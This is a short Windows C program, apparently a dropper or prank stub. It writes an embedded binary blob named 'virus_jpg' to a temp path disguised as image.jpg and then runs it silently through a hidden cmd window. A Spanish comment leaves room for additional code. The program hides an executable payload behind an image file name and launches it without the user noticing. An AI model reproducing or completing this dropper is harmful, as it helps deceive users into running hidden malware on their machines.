#include <stdio.h>
#include <windows.h>

#define FILEPATH "C:\\Windows\\Temp\\image.jpg"

extern char binary_virus_jpg_start[];
extern char binary_virus_jpg_end[];

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    FILE* fp = fopen(FILEPATH, "wb");

    if (fp) {
        fwrite(
            binary_virus_jpg_start,
            binary_virus_jpg_end-binary_virus_jpg_start,
            1, fp
        );
        fclose(fp);
    }

    WinExec("cmd /c "FILEPATH, 0);

    // Tú código:
}
